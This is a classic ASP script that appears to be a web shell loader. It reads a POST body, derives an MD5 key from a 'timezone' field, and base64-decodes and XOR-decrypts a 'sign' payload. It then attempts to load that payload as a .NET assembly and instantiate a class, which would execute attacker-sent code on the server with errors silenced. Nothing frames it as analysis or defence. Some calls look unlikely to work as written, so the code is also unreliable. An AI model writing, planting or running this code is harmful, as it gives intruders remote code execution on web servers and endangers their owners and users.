<%
On Error Resume Next

Dim postData, timezone, sign, key, decodedSign, i

' Read POST data
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1
stream.Open
stream.Write Request.BinaryRead(Request.TotalBytes)
stream.Position = 0
stream.Type = 2
stream.Charset = "utf-8"
postData = stream.ReadText
stream.Close
Set stream = Nothing

If Len(postData) > 0 Then
    ' Simple JSON parsing for timezone and sign
    timezone = ExtractJsonValue(postData, "timezone")
    sign = ExtractJsonValue(postData, "sign")
    
    If Len(timezone) > 0 And Len(sign) > 0 Then
        ' Generate MD5 key (first 16 characters)
        key = Left(MD5(timezone), 16)
        Session("k") = key
        
        ' Base64 decode
        decodedSign = Base64Decode(sign)
        
        ' XOR decrypt with offset 5
        For i = 0 To Len(decodedSign) - 1
            Dim charCode, keyIndex, keyChar
            charCode = Asc(Mid(decodedSign, i + 1, 1))
            keyIndex = ((i + 5) And 15) + 1
            keyChar = Asc(Mid(key, keyIndex, 1))
            Mid(decodedSign, i + 1, 1) = Chr(charCode Xor keyChar)
        Next
        
        ' Try to load assembly through COM interop
        Set dotnet = CreateObject("System.AppDomain").CurrentDomain
        Set loadedAssembly = dotnet.Load_3(decodedSign)
        Set obj = loadedAssembly.CreateInstance("U")
        obj.Equals(Nothing)
    End If
End If

Function ExtractJsonValue(jsonStr, fieldName)
    Dim startPos, endPos, searchStr
    searchStr = """" & fieldName & """:"
    startPos = InStr(jsonStr, searchStr)
    If startPos > 0 Then
        startPos = InStr(startPos + Len(searchStr), jsonStr, """") + 1
        endPos = InStr(startPos, jsonStr, """")
        If endPos > startPos Then
            ExtractJsonValue = Mid(jsonStr, startPos, endPos - startPos)
        End If
    End If
End Function

Function MD5(str)
    Dim hasher, hashBytes, i, result
    Set hasher = CreateObject("System.Security.Cryptography.MD5CryptoServiceProvider")
    hashBytes = hasher.ComputeHash_2(StringToByteArray(str))
    result = ""
    For i = 0 To UBound(hashBytes)
        result = result & Right("0" & Hex(hashBytes(i)), 2)
    Next
    MD5 = LCase(result)
    Set hasher = Nothing
End Function

Function StringToByteArray(str)
    Dim bytes(), i
    ReDim bytes(Len(str) - 1)
    For i = 1 To Len(str)
        bytes(i - 1) = Asc(Mid(str, i, 1))
    Next
    StringToByteArray = bytes
End Function

Function Base64Decode(base64String)
    Dim xml, node, bytes, result, i
    Set xml = CreateObject("Microsoft.XMLDOM")
    xml.LoadXML("<root />")
    Set node = xml.SelectSingleNode("root")
    node.DataType = "bin.base64"
    node.Text = base64String
    bytes = node.NodeTypedValue
    
    ' Convert to string for XOR operations
    result = ""
    For i = 0 To UBound(bytes)
        result = result & Chr(bytes(i))
    Next
    Base64Decode = result
    
    Set node = Nothing
    Set xml = Nothing
End Function
%>